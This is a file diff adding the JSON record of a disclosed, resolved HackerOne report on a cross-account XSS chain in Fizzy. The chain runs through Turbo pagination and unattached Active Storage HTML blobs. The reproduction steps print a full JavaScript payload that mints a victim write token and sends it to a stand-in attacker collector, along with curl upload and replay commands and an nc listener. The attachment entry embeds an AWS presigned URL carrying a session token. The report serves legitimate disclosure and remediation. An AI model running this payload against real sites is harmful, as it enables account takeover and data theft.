@@ -1,0 +1,137 @@
+{
+  "id": 3943339,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zOTQzMzM5",
+  "url": "https://hackerone.com/reports/3943339",
+  "title": "One-click cross-account JavaScript execution steals a victim write token through Turbo pagination and unattached Active Storage HTML",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "high",
+  "readable_substate": "Resolved",
+  "created_at": "2026-08-16T03:20:22.309Z",
+  "submitted_at": "2026-08-16T03:20:22.963Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "pirikara",
+    "url": "/pirikara",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/jw8a2fmidvjop28r7e16ixnl0huh/47c72a82657a929c13ab24e11674f7e10ea2bf67b1b9e7116b522cd7ede42f15"
+    },
+    "is_me?": false,
+    "cleared": true,
+    "verified": true,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 67,
+    "url": "https://hackerone.com/basecamp",
+    "handle": "basecamp",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/STtZ2opgRsHdKby72xs56KhB/b8e19a7691128fca51630d7f5b14644b91b3b45324f6fd488e36244d744fe35b",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/STtZ2opgRsHdKby72xs56KhB/89f037b490baf3dcca1b84283f4c85141b64c213252a9c79b56c62bf903ab542"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Basecamp",
+      "twitter_handle": "basecamp",
+      "website": "https://37signals.com/policies/security/response",
+      "about": "Basecamp is the leading online project manager and the birthplace of Ruby on Rails. Created by 37signals."
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2026-10-02T17:19:17.661Z",
+  "bug_reporter_agreed_on_going_public_at": "2026-09-02T17:19:13.228Z",
+  "team_member_agreed_on_going_public_at": null,
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "An attacker with a Fizzy account can execute arbitrary same-origin JavaScript when a signed-in victim opens one crafted public-board URL. The attacker and victim do not need to share a Fizzy account.\n\nThe JavaScript creates a write access token on the victim's global Fizzy Identity and sends the raw token to an attacker-controlled origin. The stolen token reveals the victim's Fizzy account memberships and permits authenticated read, write, and delete API requests in the victim's accounts.\n\nSuggested severity: **High** — CVSS 3.1 `AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:N` (**8.7**).\n\nThis was reproduced end to end against Fizzy commit `b12e4c52d8eafee19b0167dc5831138f1cfb7103` on 2026-08-16, using two unrelated researcher-owned accounts. Fizzy's source code was not modified.\n\n### Root-cause chain\n\n1. **Untrusted request parameters control the pagination URL.**\n\n   `app/helpers/pagination_helper.rb:13-24` passes every request parameter to Rails `url_for`:\n\n   ```ruby\n   def pagination_link(namespace, page_number, ...)\n     link_to label, url_for(params.permit!.to_h.merge(page: page_number, **url_params)), ...\n   end\n   ```\n\n   `script_name` is a reserved Rails URL-generation option. An attacker can use it to replace the beginning of Fizzy's generated page-2 URL with an Active Storage blob-proxy path. A trailing encoded `#` turns the intended public-board route into a client-side fragment, so the browser requests the blob instead of page 2.\n\n   The public-column stream template invokes automatic pagination at `app/views/public/boards/columns/streams/show.html.erb:13-19`. `app/javascript/controllers/pagination_controller.js:90-105` then creates a Turbo Frame whose `src` is the poisoned pagination URL.\n\n   The outer attack URL ends in `#stream_column-pagination-link-2`, which scrolls the pagination link into view and causes Fizzy's existing intersection observer to load it automatically. No second click is required.\n\n2. **Parameterized HTML bypasses Active Storage's exact-string dangerous-content check on the S3 path.**\n\n   Fizzy's normal direct-upload endpoint accepts an attacker-supplied `content_type`. Active Storage determines whether a blob must be served as binary using an exact-string lookup:\n\n   ```ruby\n   def forcibly_serve_as_binary?\n     ActiveStorage.content_types_to_serve_as_binary.include?(content_type)\n   end\n   ```\n\n   The default binary list contains `text/html`, but not `text/html;charset=utf-8`. The tested proxy response was consequently returned as:\n\n   ```http\n   HTTP/1.1 200 OK\n   Content-Disposition: attachment; filename=\"video-exfil.html\"\n   Content-Type: text/html;charset=utf-8\n   ```\n\n   Turbo treats the response as HTML. `Content-Disposition: attachment` does not prevent a Turbo Frame fetch response from being parsed and rendered.\n\n3. **Fizzy authorizes an unattached attacker blob to an unrelated authenticated identity.**\n\n   `lib/rails_ext/active_storage_authorization.rb:1-4` authorizes every blob with no attachments:\n\n   ```ruby\n   def accessible_to?(user)\n     attachments.includes(:record).any? { |attachment| attachment.accessible_to?(user) } || attachments.none?\n   end\n   ```\n\n   The proxy controllers enforce this rule at `lib/rails_ext/active_storage_authorization.rb:28-45`. The attacker deliberately leaves the HTML blob unattached. When a victim from another account opens the public board, the victim's global `Current.identity` satisfies authentication and `attachments.none?` authorizes the blob, even though the victim is not a member of the attacker's account.\n\n4. **Turbo activates the script and supplies Fizzy's CSP nonce.**\n\n   The blob contains the Turbo Frame expected by the pagination controller and an inline script:\n\n   ```html\n   <turbo-frame id=\"stream_column-pagination-contents-2\"><script>ATTACKER_JAVASCRIPT</script></turbo-frame>\n   ```\n\n   Fizzy uses `turbo-rails` 2.0.23. Turbo's `FrameRenderer` activates script elements after inserting a Frame response. Its `activateScriptElement` implementation creates a live script and copies the current document's CSP nonce onto it. Fizzy exposes its current nonce through `csp_meta_tag` (`config/initializers/content_security_policy.rb:47-54` and `app/views/layouts/shared/_head.html.erb:11-12`). The attacker does not need to know or guess the nonce.\n\n5. **The same-origin script creates and exfiltrates a victim write token.**\n\n   `My::AccessTokensController` skips account selection, stores access tokens on `Current.identity`, and returns the raw token in its JSON response (`app/controllers/my/access_tokens_controller.rb:4,20-33,47-49`). The public page contains `csrf_meta_tags`, so the script can submit a valid victim CSRF token.\n\n   `app/models/identity/access_token.rb:7-9` permits every HTTP method for a write token:\n\n   ```ruby\n   def allows?(method)\n     method.in?(%w[ GET HEAD ]) || write?\n   end\n   ```\n\n### Scope and backend applicability\n\n- The attacker and victim are in different Fizzy accounts.\n- Only the attacker uploads content. The victim only opens one URL and does not import a file, paste input, or upload the payload.\n- This is not an unrestricted-file-upload report: the demonstrated impact is cross-account same-origin JavaScript execution followed by theft and use of a victim credential.\n- The demonstrated parameterized-MIME variant applies to Fizzy SaaS's S3 Active Storage path. A separate Disk-service test rejected the same parameterized upload because that path canonicalized the request MIME type before comparison.\n- `saas/config/environments/production.rb:2` selects `purestorage`, and `saas/config/storage.yml:23-33` defines `purestorage` as an S3 service. The local E2E proof used the same Active Storage S3 adapter with an isolated MinIO S3-compatible endpoint.\n\n### Suggested remediation\n\n1. Replace `params.permit!` in pagination URL generation with an explicit allowlist. Do not forward URL-generation control parameters from request parameters, including Rails reserved options such as `script_name`, `host`, `protocol`, `port`, and `only_path`, or route-selection keys such as `controller` and `action`.\n2. Do not authorize a blob merely because `attachments.none?`. Bind each direct upload to its creating identity/account and authorize an unattached blob only to that principal.\n3. Normalize supplied MIME types to their media type before comparing them with `content_types_to_serve_as_binary` and `content_types_allowed_inline`. Force HTML, XML, SVG, and unattached blobs to `application/octet-stream` at the proxy boundary.\n4. Serve user-controlled uploads from a separate cookieless origin that cannot access Fizzy sessions and is absent from `script-src`.\n5. Add an integration test for parameterized HTML uploaded through the S3 direct-upload path and returned through an automatic Turbo pagination Frame.\n\n## Steps To Reproduce:\n\nThe following uses two unrelated, researcher-owned accounts and an isolated local deployment. Replace all uppercase placeholders with values from the test environment.\n\n1. Run Fizzy at commit `b12e4c52d8eafee19b0167dc5831138f1cfb7103` in its SaaS production configuration with the S3 Active Storage service enabled. Create:\n\n   - attacker account `/1`;\n   - unrelated victim account `/2`;\n   - an attacker-owned public board with at least 16 cards, so page 2 exists on its public `columns/stream` route; and\n   - a victim-owned board to use for the harmless write/delete proof.\n\n   Keep the victim signed in to Fizzy in a separate Chrome profile.\n\n2. Use the following exact HTML body. It is **555 bytes without a trailing newline**, and its base64-encoded MD5 checksum is **`yCDDFKjBAvUTEpu7JW/MYQ==`**:\n\n   ```html\n   <turbo-frame id=\"stream_column-pagination-contents-2\"><script>void async function(){const csrf=document.querySelector(\"meta[name=csrf-token]\").content;const response=await fetch(\"/my/access_tokens.json\",{method:\"POST\",credentials:\"same-origin\",headers:{\"Content-Type\":\"application/json\",\"X-CSRF-Token\":csrf},body:JSON.stringify({access_token:{description:\"fizzy-video-exfil\",permission:\"write\"}})});const {token}=await response.json();location.href=\"http://attacker.fizzy.localhost:45000/collect?token=\"+encodeURIComponent(token)}()</script></turbo-frame>\n   ```\n\n3. While authenticated as the attacker, create an unattached blob through Fizzy's normal direct-upload API:\n\n   ```bash\n   curl -i -b attacker.cookies \\\n     -H 'Content-Type: application/json' \\\n     -H 'X-CSRF-Token: ATTACKER_CSRF' \\\n     --data-binary '{\"blob\":{\"filename\":\"video-exfil.html\",\"content_type\":\"text/html;charset=utf-8\",\"byte_size\":555,\"checksum\":\"yCDDFKjBAvUTEpu7JW/MYQ==\"}}' \\\n     'http://app.fizzy.localhost:43080/1/rails/active_storage/direct_uploads'\n   ```\n\n   Record the returned `signed_id`, `direct_upload.url`, and `direct_upload.headers`. Do not attach this blob to any record.\n\n4. PUT the exact 555-byte body from step 2 to the returned storage URL, using the returned upload headers:\n\n   ```bash\n   curl -i -X PUT \\\n     -H 'Content-Length: 555' \\\n     -H 'Content-MD5: yCDDFKjBAvUTEpu7JW/MYQ==' \\\n     -H 'Content-Type: text/html;charset=utf-8' \\\n     -H 'Content-Disposition: inline; filename=\"video-exfil.html\"' \\\n     --data-binary '<turbo-frame id=\"stream_column-pagination-contents-2\"><script>void async function(){const csrf=document.querySelector(\"meta[name=csrf-token]\").content;const response=await fetch(\"/my/access_tokens.json\",{method:\"POST\",credentials:\"same-origin\",headers:{\"Content-Type\":\"application/json\",\"X-CSRF-Token\":csrf},body:JSON.stringify({access_token:{description:\"fizzy-video-exfil\",permission:\"write\"}})});const {token}=await response.json();location.href=\"http://attacker.fizzy.localhost:45000/collect?token=\"+encodeURIComponent(token)}()</script></turbo-frame>' \\\n     'DIRECT_UPLOAD_URL_RETURNED_BY_FIZZY'\n   ```\n\n5. Start an HTTP listener representing the attacker-controlled collector:\n\n   ```bash\n   nc -l 45000\n   ```\n\n   `attacker.fizzy.localhost:45000` is a separate origin from Fizzy and is independent of attacker account `/1`. In a real attack this can be any attacker-controlled HTTPS endpoint.\n\n6. In the signed-in victim Chrome profile, open the following attacker-board URL once:\n\n   ```text\n   http://app.fizzy.localhost:43080/1/public/boards/ATTACKER_PUBLIC_KEY/columns/stream?script_name=%2F1%2Frails%2Factive_storage%2Fblobs%2Fproxy%2FHTML_SIGNED_ID%2Fvideo-exfil.html%23#stream_column-pagination-link-2\n   ```\n\n   Wait two to five seconds without clicking anything else.\n\n7. Observe that the independent attacker collector receives the victim's raw access token:\n\n   ```http\n   GET /collect?token=VICTIM_WRITE_TOKEN HTTP/1.1\n   Host: attacker.fizzy.localhost:45000\n   Referer: http://app.fizzy.localhost:43080/\n   ```\n\n8. Copy the exact token received by the collector and use it outside the victim browser:\n\n   ```bash\n   curl -i \\\n     -H 'Authorization: Bearer VICTIM_WRITE_TOKEN' \\\n     'http://app.fizzy.localhost:43080/my/identity.json'\n   ```\n\n   The response is `200 OK` and identifies the unrelated victim and victim account `/2`.\n\n9. Demonstrate write access using only researcher-owned test data:\n\n   ```bash\n   curl -i \\\n     -H 'Authorization: Bearer VICTIM_WRITE_TOKEN' \\\n     -H 'Content-Type: application/json' \\\n     --data-binary '{\"card\":{\"title\":\"Video E2E proof\"}}' \\\n     'http://app.fizzy.localhost:43080/2/boards/VICTIM_BOARD_ID/cards.json'\n   ```\n\n   The response is `201 Created`. Record the returned card number.\n\n10. Confirm delete access and remove the test card:\n\n    ```bash\n    curl -i -X DELETE \\\n      -H 'Authorization: Bearer VICTIM_WRITE_TOKEN' \\\n      'http://app.fizzy.localhost:43080/2/cards/CREATED_CARD_NUMBER.json'\n    ```\n\n    The response is `204 No Content`.\n\n### Observed end-to-end evidence\n\nThe recorded PoC demonstrated the complete chain with two unrelated researcher-owned accounts:\n\n- victim identity `Victim HackerOne` belonged to account `/2`;\n- the victim opened the crafted public-board URL belonging to attacker account `/1`;\n- an independent attacker-controlled collector received the raw victim write token;\n- that exact token returned `200 OK` from `/my/identity.json` and disclosed the victim's account membership;\n- the token created card #15 in the victim's board with `201 Created`; and\n- the same token deleted card #15 with `204 No Content`.\n\nThe collector received:\n\n```http\nGET /collect?token=qEZD...2xSQ HTTP/1.1\nHost: attacker.fizzy.localhost:45000\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36\nSec-Fetch-Site: same-site\nSec-Fetch-Mode: navigate\nSec-Fetch-Dest: document\nReferer: http://app.fizzy.localhost:43080/\n```\n\nUsing that same collector-received token returned the victim Identity:\n\n```http\nHTTP/1.1 200 OK\nContent-Type: application/json; charset=utf-8\nX-Request-Id: 6879c2e0-76d6-41e0-ab87-29725cffc8c2\nDate: Sun, 16 Aug 2026 02:58:53 GMT\n\n{\"id\":\"03goro3mqj1abrb7ql9x31yhj\",\"accounts\":[{\"id\":\"03goro7h4q1x6k1rmnfu53p0r\",\"name\":\"Victim's Fizzy\",\"slug\":\"/2\",\"user\":{\"id\":\"03goro7h6zxop2k3q4zdbuebu\",\"name\":\"Victim HackerOne\",\"role\":\"owner\",\"email_address\":\"victim-final-hackerone@example.com\"}}]}\n```\n\nThe token then created a card in the victim's board:\n\n```http\nHTTP/1.1 201 Created\nLocation: /2/cards/15.json\nX-Request-Id: 241ea66d-2c40-4a5a-aaa4-8d138e757643\nDate: Sun, 16 Aug 2026 02:59:05 GMT\n\n{\"id\":\"03goukp3m3k7gj2l9qyppm9v8\",\"number\":15,\"title\":\"Video E2E proof\",\"status\":\"published\",\"board\":{\"id\":\"03goro7h7ls8flhg0x7czuso5\",\"name\":\"Playground\"},\"creator\":{\"id\":\"03goro7h6zxop2k3q4zdbuebu\",\"name\":\"Victim HackerOne\"}}\n```\n\nFinally, the same token deleted that card:\n\n```http\nHTTP/1.1 204 No Content\nX-Request-Id: 74e28ffe-1ee7-476c-9cad-ef5345ce4e05\nDate: Sun, 16 Aug 2026 02:59:23 GMT\n```\n\n## Impact\n\nA low-privileged attacker with their own Fizzy account can compromise an unrelated signed-in victim's Fizzy Identity by convincing the victim to open one attacker-owned public-board URL. No shared account is required. The attacker gains arbitrary JavaScript execution in Fizzy's origin and uses it to create an Identity-scoped write bearer token, exfiltrate that token to attacker-controlled infrastructure, and replay it without access to the victim's browser or session cookie.\n\nThe stolen token is attached to the victim's global Identity, not to the attacker's account or public board. It discloses the victim's account memberships and authorizes API requests with the victim's existing access in those accounts. This allows the attacker to read confidential Fizzy data and create, modify, or delete data as the victim. The E2E proof specifically demonstrated disclosure of the victim's Identity and account membership, followed by creation and deletion of a card in an unrelated victim-owned account.\n\nThe token remains usable independently of the browser session until it is revoked. The resulting security impact is therefore cross-account compromise of confidentiality and integrity with the victim's privileges (`C:H/I:H`); no availability impact is claimed.",
+  "weakness": {
+    "id": 61,
+    "name": "Cross-site Scripting (XSS) - Reflected"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 6477825,
+      "file_name": "_____2026-08-16_11.58.04.mov",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/zljga1r4yzqgsgrg0qnqmdkti5m0?response-content-disposition=attachment%3B%20filename%3D%22_____2026-08-16_11.58.04.mov%22%3B%20filename%2A%3DUTF-8%27%27_____2026-08-16_11.58.04.mov&response-content-type=video%2Fquicktime&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ5KAQ6PGN%2F20261002%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20261002T185308Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEM%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIEKYVsaGlhbXhRF%2FF9dYbWlfyVZgdYbbWVWFSSycRvSEAiBl5Hov5C5PpgmEWjRGijYslbqsWdPsC2%2FNbPJgmJir0Cq7BQiY%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAMaDDAxMzYxOTI3NDg0OSIM6Ljmsjjnnppr9fjOKo8F2KUeip01VuiMrVZEZVJ%2FsRyaiTZ8vk1Q8J6cHKuXK3aDljqFq6dzX%2Fo%2FUYR8%2F2Rh9yjG%2FEKOGXpkFcylFsr5aK4m7MMW8lBj6bFtGy2Wog5RI94%2FLk%2FO2KpvO7D15%2Fs0nUrSrfZmZaCYyDypBZxRN3E2Xye8OXFGURrGsvhDqtZAHxmW0FrvOoR9U4O0VxvcI%2FguSD1thc%2Bo2D5Qi9Ajqw5ka3BL4aXMRoI9DAKi%2BJpw9HTkskZZYxmsVd3AkU%2FBXxLL3JYUeS5Xs5KKe27YOeJJPY4nBqwMiUAaiYgepKtQAaZ8RRW81Wsp9RMs45p3DXFWJoMhwUb7I%2BIr5OMYxClT0EpMJxVLs5CuKC7DSno8DXSSLu%2BfbZ4RCWjF8Peix%2FtHJP39gstVG2A86fGvfl6O0ob6YvRoFcDR%2BpkWuDEMjgsQfMrc4XsI9KAGOGixpbeQP94NhVFUIoZL2Uu69X7qk0zBpeWgNtMZfaxoIZyRRpizIhqEXbOr3JNPHuYODbacal1h1vbRoKk15Wj5YABrMLn2nGbpOmG3GsTanCaZOMxq1aBYEnYufdsgQ2yfBT3zjizyf3qkIvnBX3dOQAdb%2BDg305RGF8tKlcjTYi7JHXZGlJMP2IbC37uK9kCpxFa0rBiTrMM7THx7DLdCeD1b98dquBSEfzh%2BqKPM1F3PHOKSKVBfmNN83f1u6FJaE90OEUrwc9DbqD0%2BnZCziq9bA6%2B32jnwq116CkJLVQxUNnyG5zQH65mmBUOWpkMHxFqHmwnag91E3CnjaBvugkugj3PkgTdTQdqCWQB6D6XXMvvucpcYziigdo6Rc8b00Nypz%2BET%2FwrOYzJWYbjDERukapfxvQgUvQr%2Fd4EHazCegP%2FVBjqyAQth6G9heKmdYBG9LczrGh57URm6g8K%2F2t%2BdEjDmFlnZzlu5ZG9RJM52J6KLyiN9n9HR8HsrLHc3gSh8CX%2BTvJTUR%2BsRTKn%2FgoldVBc8wPdmATTTgCVz0oSLt0fAmRD9%2BX%2BQPCZSIA2V5GuJFZYO4UZinEih%2Bljcv9G%2BpZhNelOkzxgsH%2FUYC9hyuoxsv%2B8qUTF%2B1irnpwK7NTOHkerIgDkeASG%2Bb5u7CU6fDJ7%2FjeCZdso%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=b01f50bdc1e1c27e9a980ba135816cc4167bf457f18f582d586db9c23051ad29",
+      "file_size": 93800340,
+      "type": "video/quicktime",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2026-10-02T17:19:13.375Z",
+  "allow_singular_disclosure_after": -5635.55109029,
+  "singular_disclosure_allowed": true,
+  "vote_count": 3,
+  "voters": [
+    "pirikara",
+    "hexa34",
+    "hope_no_dupe"
+  ],
+  "severity": {
+    "rating": "high",
+    "score": 8.7,
+    "author_type": "Team",
+    "metrics": {
+      "attack_vector": "network",
+      "attack_complexity": "low",
+      "privileges_required": "low",
+      "user_interaction": "required",
+      "scope": "changed",
+      "confidentiality": "high",
+      "integrity": "high",
+      "availability": "none"
+    }
+  },
+  "structured_scope": {
+    "databaseId": 974588,
+    "asset_type": "URL",
+    "asset_identifier": "app.fizzy.do",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
